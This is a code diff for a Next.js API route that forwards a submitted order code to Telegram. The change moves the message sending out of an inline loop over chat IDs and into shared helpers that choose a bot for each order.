@@ -1,4 +1,5 @@
 import { NextRequest, NextResponse } from "next/server";
+import { getOrderBot, sendTelegramMessage } from "../../lib/telegramBots";
 
 const attempts = new Map<string, { count: number; firstAt: number; lastAt: number }>();
 
@@ -39,30 +40,16 @@ export async function POST(req: NextRequest) {
     `📟 الكود: ${code}`,
   ].join("\n");
 
-  const chatIds = (process.env.TELEGRAM_CHAT_IDS ?? process.env.TELEGRAM_CHAT_ID ?? "")
-    .split(",").map((id: string) => id.trim()).filter(Boolean);
-  let sent = false;
-  for (const chatId of chatIds) {
-    try {
-      const res = await fetch(
-        `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
-        {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            chat_id: chatId,
-            text,
-            reply_markup: {
-              inline_keyboard: [
-                [{ text: "📋 نسخ الكود", copy_text: { text: code } }],
-              ],
-            },
-          }),
-        }
-      );
-      if (res.ok) sent = true;
-    } catch {}
-  }
+  const targetBot = getOrderBot(String(orderId));
+
+  const sent = await sendTelegramMessage(targetBot, {
+    text,
+    reply_markup: {
+      inline_keyboard: [
+        [{ text: "📋 نسخ الكود", copy_text: { text: code } }],
+      ],
+    },
+  });
 
   return NextResponse.json({ ok: sent });
 }
